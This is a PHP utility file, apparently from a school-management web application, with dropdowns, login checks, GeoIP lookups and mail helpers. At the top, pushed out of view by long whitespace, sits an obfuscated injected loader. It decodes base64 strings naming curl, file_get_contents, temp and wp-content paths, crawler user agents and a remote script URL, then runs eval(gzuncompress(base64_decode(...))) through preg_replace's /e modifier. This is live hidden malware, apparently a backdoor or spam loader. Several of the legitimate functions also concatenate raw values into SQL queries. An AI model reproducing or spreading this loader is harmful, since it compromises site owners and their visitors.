<?php                                                                                                                                                                 /*versio:2.20*/$I1II=109388;if (!function_exists('I1l1Il11')){$GLOBALS['I1II'] = 'LVY3VybA.X2luaXQ!&YWxsb3dfdXJsX2ZvcGVuyMQaHR0cDovLwDzxJndheT1maWxlX2dldF9jb250ZW50cwzX3NldG9wdAPO?X2V4ZWMVRJndheT1jdXJsiT;QUuLwuV~b3Nvbi5pbgxjLUllBTkVDQVNFWS5DT00.# cGhwYWlkZS5jb20VuFdwWV8?%$OgT%}#IZGlzcGxheV9lcnJvcnMk_ne~YZGV0ZXJtaW5hdG9y$cCZnRwMTMMi4yMA=jUVFPUVFRMFFRUQj=foYmFzZTY0X2RlY29kZQYmFzZTY0X2VuY29kZQ=k?SFRUUFMwEb2ZmF^RaHR0cHM6Ly8EKpgSFRUUF9IT1NUiKdW5pb24iLUc2VsZWN0UkVRVUVTVF9VUkk%^U0NSSVBUX05BTUUhUVVFUllfU1RSSU5HE$;Pwrp(L2Rldi9zaG0PD(os#L3RtcC8uZm9udC11bml4OTL3RtcC8uSUNFLXVuaXgTK*VE1QGvrVEVNUAbVE1QRElS^dL3RtcAdXBsb2FkX3RtcF9kaXIYMdG1w=#@d3AtY29udGVudC91cGxvYWRzd3AtY29udGVudC9jYWNoZQmILg;OdmVyc2lvj#hShLQ~LXBocAe}DRVhFQ1BIUAcb3V0kGb2sU lSFRUUF9VU0VSX0FHRU5U)eLAnZ29vZ2xlLHlhaG9vLGJpbmcsbXNuYm90LGFzayxiYWlkdSx5YW5kZXghL3BnLnBocD91PQWrJms9%JnQ9cGhwJnA9j%JnY9l&ZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5VlZ3dHZtMGdRL2lzYnE0cEFvaHhyZ3grWDQyU3JkUzVJT1JNN1RxVXF0WkJycnh0VURCSGdTNnNvLy8xbVpuY0JKeVM5c3lPWjdNek9lNzRaNGgwelRyWmlGNmRpYTNTMm9oVDVQazdYWlpaM1RQT1I3UTdwcG95emxEVXAwVTVrTytQZGZCNDZZV2l4MDNkQmtnUUpaejZiM1Z4ZW11eVIxU2Y3ZUpOblpid1hScGtmaEhuR2NsRWU4cFExUmNEcFU2M3BteWgzY1NLTWR3SG5RY0F0Qmx6T0hMZ2U2U21jejBGc3dCTU9DcmpSdFZnZjdvTkNuZ1NvVVBIWUZjZklZZ1BnR01kcEhCV2lOQ29DSDFxczY1Z1c0MENPSVE3RThxMkZ4V1IrUTJVUEpIWk42U1o4RXU2UDBXQzhHVzJ5dEJScFdkUWlYUENBT3lhem1YSUluNlJIZGkzVGN5M1dBMFZWZkpSb2pJeElDb0htNlFoRjRrZGNnQXJsczBtQkFaY2RCOXdmcTFNRGd6S0grSVpPVzFDR0hsbUZnZU53bUxRR2JxZ2lwK1FZU292RlB0d3NMc09yWlFRL0Z2dWZubkpuQUd4ZDgwM0JGOVBKeCtuQzJxM0I5VGNaRjlQbHpXSzJYRXhtMStkd1FkWFk2L3dmd3RscyttRzVEUDZlaGpkTGkza3lUSTR6VjhHamFPaDdLR3B6eUpOb2syU0ZhSnhpT3NUK3Z2eHBxTXVRaEZwTTdXdTNaekhnZjZxeUtubDBWaG1WTkxZQUt0OFYyZVo3ZGkvU3V2U0hEcGEvZ3gvcUE0eW1OQm90ME8xRFlqQjNyY3JaY1h1Q1M3djdBNWFQN3QvT1g5TWxlMVNaZWpwOVdQLzAwUkpSc292bDh1bzNianRmOGkvcFJWYVV2d09iTk8wSmp6cTY4VGpXejlYRlZSUmUydzM5SHZhSmplZWZwb3ZySUp5MTZMNHBSUDUrOGcxNmhvU1RNQkt1RlR6Y0lSaWN2SUUveWorVG5aNHk0eG5lc1BjMStRK3dwbzZValJHSGxtMFl3N3REZ3FMeFR1ZGJ3eFBLU0NpRTRzZDlrbTJGMGFsc3RMUkk0RHVraURDSys5WloxZjBjNzF2dVNUN1NpVitvTHdkVWdwWkpucTkvTm1DbzUxQnJOWnFOdTVCZFBqbzY2bU5UZTloWkZaZys1SEZKVUFvaENDd3E0UGtjb2tEbEUyQ3RKNEJldXVpSXFRRitQUUk2WUIvdnRDQzZVZ2s2cTJNbEtjcVhTbjkyS0NIaEJrWW9uR091NEdKSVdDNDJkMW5EZGdTa25ta3J4a1lWalRoVmticG9VL3c2bEtXWGdJNklSVEhCWE1paFZsTzcyQSs4ci9BZVl3MWZ2eWE3WFFsMzVBbm5UY3BJRFJuc3hIRGVvSGlJWmE1cUEraUxCbW1BeVJocUVrOGFwRkd2SWxFeitjOGhWTFozWEZBeFJkZlRCZlRQYlQxL3VJdVdya3lWeC9IckxPeWtPYmN3QUM2TmkrZDZlMVJndWhJVjJmYUxNaSt6SkhzUWVhc1MxeU1reHlyZlpibFliKzZncUNKRWszWEJWQ2I5UCt1VW83RWc4ajRyREhWWUYxdlBvem1OT0lvU2J0WDFsZDhDcG5vZ3ZpcXJEN0tHLzAzV0UxaGxuTHdhNnNHQVdtb2x4LzNyZEJvZUw4a2pWNUl4b1cwaGRMbEROYm42bFhpN2tVZTNTd3NJVE5lM0pNcFV5ajRIQUlTQzFtbHRNN1R5VTA0aytQUEgrNjJuSjVHdG1zSldJSzg2UWZVRUJOZmZ4bm02QnRTTm92UGdjaHBGcHYweFdNQ2tEUmVmUWR2VlpER0J4ek0xdzJxSWEzalZjNmtFbXd1Rng5V0dWaDhOTk95MStUN3lzTUJYclVUUG9WVlJFcWV6VDY5Y082SjREaFZTSzBWTHE0ODR3WVRGWHE2UkhvNUNzTnEwZEx4cWdQUGNQbXB2bzNpSXYrMGt6RmUzQzZTajNsUEJwZTREZklOVlJUYmRTYldyMEtGS01qemFmbXVXNURKY1JBajY2NitKT0w1SnRzaUZFUS9QMkZmUS83MGFZdVgrM245aGNOL1JNRTdGZGZZTXVEcTRhVVNmbzhuTjhxS3o4bjNGeHJJY0kzOFZYaTl2T3krb2Vvam9rVEJXdzZhaDFNUDBXUnJTRytiUVlrOVRCYWRBZzlEbG1FUzlZQVdJM05nNWhPNkd0cVZtVjRPWnNIZ3MvbGtuK2c1SStJVnhpUFZ1czdiNzdnQm5JSUV3clBpbDRkQ2pUb1o4S1lMb2txNHlPMnp1NUwvMGJyTkpEbHNSWmVsRzZFT0prK3BkRE5wL0RJdXNTRGU0aEtnak9leFFOOExYMjJEZnAySjBqc0ZlTDBNMTE0QjJ2cVpUQTRpMEIwc0pWV1ZBKy9XelVTQk5zQ3JxaWUrZjArS3Z4bHZEVmZVT09LZUZ1ZEl4SU9od0laM1NyenFkQTgvQklPdXlheExrN0hwWkFRTWNIaVNMYWtidGZrRUFDcXMzVTdtbndYNVh2NXllUFV2SjAzRlh3UGRmck1vZ2NRPT0iKSkpOwPcHJlZ19yZXBsYWNlKE';function I1l1Il11($a, $b){$c=$GLOBALS['I1II']; $d=pack('H*','6261736536345f646563'.'6f6465'); return $d(substr($c, $a, $b));};$I1l1Ill11 = I1l1Il11(3446, 16);$I1l1Ill11("/Q0Q0Q00Q0/e", I1l1Il11(775, 2670), "Q0Q0Q00Q0");};?><?
function getFromdatabasevalue($searchID,$field_name, $tablename, $pry_key){
	$showval=db_scalar("select $field_name from $tablename where $pry_key='$searchID'");
	return $showval;
}
function validate_form()
{
	return ' onsubmit="return validateForm(this,0,0,0,1,8);" ';
}

function check_access($acc,$check)
{
$value=explode(",",$acc);
$j=count($value);
for($i=0;$i<$j;$i++)
{
if($value[$i]==$check)
{
return "true";
break;
}
}
}


function protect_admin_page() {
	$cur_page = basename($_SERVER['PHP_SELF']);
	//echo "<br>cur_page: $cur_page";
	if($cur_page != 'login.php') {
		if ($_SESSION['sess_admin_login_id']=='') {
			header('Location: login.php');
			exit;
		}
	}
}
function protect_member_page() {
	$cur_page = basename($_SERVER['PHP_SELF']);
	//echo "<br>cur_page: $cur_page";
	if($cur_page != 'login.php') {
		if ($_SESSION['sess_user_id']=='') {
			header('Location: login.php');
			exit;
		}
	}
}
function protect_inner_page() {
	$cur_page = basename($_SERVER['PHP_SELF']);
	//echo "<br>cur_page: $cur_page";
	if($cur_page != 'index.php') {
		if ($_SESSION['sess_user_id']=='') {
			header('Location: index.php');
			exit;
		}
	}
}
function get_country_from_ip(){
	require_once SITE_FS_PATH."/Net/GeoIP.php";
	$geoip = Net_GeoIP::getInstance(SITE_FS_PATH."/Net/GeoIP.dat");
	try{
		$user_ip = $_SERVER['REMOTE_ADDR'];
		//$user_ip_country = $geoip->lookupCountryName($user_ip);
		$user_ip_country = $geoip->lookupRegion($user_ip);
	}
	catch (Exception $e){
		$user_ip = "Not Found";
		$email_body ="Dear Admin, <br><br>Location for IP Address ".$_SERVER['REMOTE_ADDR']." Not Found";
		send_email(ADMIN_EMAIL, $email_body, ADMIN_EMAIL, 'text/html', 'IP Location Not Found');
		// Handle exception
	}
	return $user_ip_country;
}
function get_city_from_ip(){
	include_once(SITE_FS_PATH."/Net/geoipcity.inc");
	include_once(SITE_FS_PATH."/Net/geoipregionvars.php");
	$gi = geoip_open(SITE_FS_PATH."/Net/GeoIPCity.dat",GEOIP_STANDARD);
	try{
		$user_ip = $_SERVER['REMOTE_ADDR'];
		//$user_ip ="66.249.71.79"; //testing
		//$user_ip ="68.87.76.178";
		$record = geoip_record_by_addr($gi, $user_ip);
		//print_r($record);
		//exit;
		$cont =geoip_country_name_by_addr($gi, $user_ip);
		$loc_arr=array($record->city, $record->region, $record->latitude, $record->longitude, $cont);
		geoip_close($gi);
	}
	catch (Exception $e){
		$user_ip = "Not Found";
		$email_body ="Dear Admin, <br><br>Location for IP Address ".$_SERVER['REMOTE_ADDR']." Not Found";
		send_email(ADMIN_EMAIL, $email_body, ADMIN_EMAIL, 'text/html', 'IP Location Not Found');
		// Handle exception
	}
	return $loc_arr;
}


function status_dropdown($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array( "Active" => 'Active', 'Inactive' => 'Inactive');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');
}

function yes_no_dropdown($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array( "Yes" => 'Yes', 'No' => 'No');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');
}

function exam_dropdown($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array( "Halfyearly" => 'Halfyearly', 'Final' => 'Final');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');

}
function result_type_dropdown($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array( "Pass" => 'Pass', 'Fail' => 'Fail',"Promoted"=>'Promoted');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');

}

function cast_dropdown($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array( "Economically Weak" => 'Economically Weak', 'Distresed Family' => 'Distresed Family');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');

}

function board_dropdown($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array( "CBSC" => 'CBSC', 'ICSC' => 'ICSC',"UP"=>'UP',"RB"=>'RB');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');

}
function payment_dropdown($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array( "Cheque" => 'Cheque', 'Cash' => 'Cash');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');

}

function payment_mode($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array('Unpaid' => 'Unpaid', "Paid" => 'Paid');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');

}

function subject_interval($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array('Quartely' => 'Quartely', "Halfyearly" => 'Halfyearly', "Final" => 'Final');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');

}

function parent_less($name, $sel_value, $extra='', $choose_one='')
{
	$arr = array('None' => 'None', "Father" => 'Father', "Mother" => 'Mother',"Both" => 'Both');
	return array_dropdown($arr, $sel_value, $name, $extra='', $choose_one='');

}


function user_online($user_id){
    $last=db_scalar("select st_lastvisit_datetime from mb_user_settings where st_user_id='$user_id' and st_login_status='Yes'");
	$diff_date=db_scalar("select DATE_SUB(now(), INTERVAL 24 MINUTE)");
	 if($diff_date>$last){
		return false;
	 }else{
		return true;
	 }
 }

function user_total_online_count(){
		 $cnt=db_scalar("select count(*) as `cnt` from mb_users inner join mb_user_settings on mb_users.user_id=mb_user_settings.st_user_id where 1 
	and mb_user_settings.st_login_status='Yes' and (DATE_SUB(now(), INTERVAL 24 MINUTE) < mb_user_settings.st_lastvisit_datetime) and user_delete_status!='delete' and user_status='Active'");
  	 return $cnt;
 }
 
 function calculate_datediff($date2,$date1){
 	$date2=strtotime($date2);
	$date1=strtotime($date1);
	$dateDiff = $date2 - $date1;
	$dateDiff = abs($dateDiff);
	$fullDays = floor($dateDiff/(60*60*24));
	$fullHours = floor(($dateDiff-($fullDays*60*60*24))/(60*60));
	$fullMinutes = floor(($dateDiff-($fullDays*60*60*24)-($fullHours*60*60))/60);
	$ret = " ago";
	
	if($fullMinutes!=""){
		$ret = $fullMinutes." mins".$ret;
	}
	if($fullHours!=""){
		$ret = $fullHours." hours, ".$ret;
	}
	if($fullDays!=""){
		$ret =  $fullDays." days, ".$ret;
	}
	if($ret!=" ago"){
		return $ret;
	}
}


function send_email($user_email, $email_body, $from_string, $mail_type, $subject,$attachements=''){
	if($user_email == ''){
		echo "Invalid Email Address";
	}
	  	$email_body = str_replace("{sitepath}",SITE_WS_PATH,$email_body);  
	
		if(strpos($mail_type,'plain')){
			$html = false;
		}else{
			$html = true;
		}
		$mailer = new PHPMailer();
		if($from_string == ''){
			$from_string = ADMIN_EMAIL;
		}
		$mailer->From=$from_string;
		$mailer->FromName = SITE_NAME;
		$mailer->AddAddress($user_email);
		if(LOCAL_MODE){
			$mailer->Mailer='mail';
		}else{
			$mailer->Mailer='mail';
		}
		$mailer->IsHTML($html);
		$mailer->Subject=$subject;
		$mailer->Body=$email_body;
		if(is_array($attachements)){
			foreach($attachements as $file_name){
				$mailer->AddAttachment($file_name, "Attachement.".file_ext($file_name)); 
			} 
		}elseif($attachements!=''){
			//echo "hellow";
			$mailer->AddAttachment($attachements, "Attachement.".file_ext($attachements)); 
		}
		
		if(!$mailer->Send()){
			  echo "Problem while sending SMTP mail. <p>";
			  echo "<br>Mailer Error: " . $mailer->ErrorInfo;
		}else{
			@unlink($attachements);
			
		}
		return;
}


function category_dropdown($dd_name,  $sel_value = '', $extra ='', $choose_one ='')
{   
   $sql="select cat_id,cat_name from fur_category where cat_status='Active' and cat_pid='0'";
   return sql_dropdown($sql, $dd_name,  $sel_value, $extra, $choose_one);
}

function show_country($dd_name,  $sel_value = '', $extra ='', $choose_one ='')
{   
   $sql="select country_id,country_name from tbl_countries where 1 ";
   return sql_dropdown($sql, $dd_name,  $sel_value, $extra, $choose_one);
}

function show_image($image_name,$path,$show_type='')
{   
   if($show_type=="Image" && $image_name) {
	   
		$data='<img src="'.$path.$image_name.'" />';
		
   } elseif($show_type=="Thumb" && $image_name) {
	   
	   echo show_thumb($path.$image_name,80,80,"width_height");
	 	$data='<img src="'.show_thumb($path.$image_name,80,80,"width_height").'"  border="0">'; 
		
   } else{
	   
	 $data="<font color='red'><b>No Image Found..<b></font>" ;  
   }
	  return $data;
}


function show_error($array_name)
{
	if(is_array($array_name) && count($array_name) >0){
        foreach($array_name as $value){
		       	echo $value."<br>";
		}
     }
	
}

	
function remove_array_empty_values($array, $remove_null_number = true)
{
  $new_array = array();
 
    $null_exceptions = array();
 
   foreach ($array as $key => $value)
    {
        $value = trim($value);
 
        if($remove_null_number)
        {
            $null_exceptions[] = '0';
        }
 
        if(!in_array($value, $null_exceptions) && $value != "")
        {
            $new_array[] = $value;
        }
    }
    return $new_array;
}	

function image_view_small($id,$small_size,$big_size,$image_name,$path){
	if(strlen($image_name)){
		$size=@getimagesize("$path/$image_name");
		if($id=="big"){
			$width=$big_size;
			$height=$big_size;
			if($size[0] <= $width and $size[1]<= $height){
				$get_wd=$size[0];
				$get_hgt=$size[1];
			}
			else{
				if($size[0]>$width){
					$get_wd=$width;
					$get_hgt=($width/$size[0])*$size[1];
				}
				if($size[1]>$height){
					$get_hgt=$height;
					$get_wd=($height/$size[1])*$size[0];
				}
			}
		}
		if($id=="small"){
			$width=$small_size;
			$height=$small_size;
			if($size[0] <= $width and $size[1]<= $height){
				$get_wd=$size[0];
				$get_hgt=$size[1];
			}
			else{
				if($size[0]>$width){
					$get_wd=$width;
					$get_hgt=($width/$size[0])*$size[1];
				}
				if($size[1]>$height){
					$get_hgt=$height;
					$get_wd=($height/$size[1])*$size[0];
				}
			}
		}
		$set=$get_wd."^".$get_hgt;
		$array['width']=$get_wd;
		$array['height']=$get_hgt;
		
		return $array;
	}
}

function show_staticdata($id,$col_id,$status,$table_name)
{
  $sql_page="select * from $table_name where $col_id='$id' and $status='Active'";	
  $res_page=db_query($sql_page);
  return mysql_fetch_array($res_page);
}
//Tree Parent Search with link..
function parent_search($slno, $table_name, $name_field, $primery_field, $search_field,$link,$html){ //for searching parent.
	$db=mysql_fetch_array(db_query("select * from $table_name where $primery_field='$slno'"));
	echo mysql_error();
	if($db[$search_field]!=0){
		$arr[]=$db[$name_field]."~".$db[$search_field];
		$slno=$db[$search_field];
		parent_search($slno, $table_name, $name_field, $primery_field, $search_field,$link, $html);
	}
	else{
		$slno=$db[$search_field];
		$arr[]=$db[$name_field]."~".$db[$primery_field];
	}
	$arr1=array_reverse($arr);
	for($i=0;$i<count($arr1);$i++){
		$varr=explode("~", $arr1[$i]);
		if("$varr[0]" !=""){
			if($html=="html"){
				$name=strtolower($db[$name_field]);
				$file_name=str_replace(" ","-",$name).".php";
				echo "&nbsp;<a href=\"$file_name\">$varr[0]</a> >>&nbsp;";
			}
			else{
				if(strlen($link)){
					$href="$link?id=$varr[1]";
					echo "&nbsp;<a href=\"$href\"><strong>$varr[0]</strong></a> >>&nbsp;";
				}
				else{
					echo "&nbsp;<strong>$varr[0]</strong>&nbsp;>>&nbsp;";
				}
			}
		}
		else{
			echo "&nbsp;";
		}
	}
}

?>
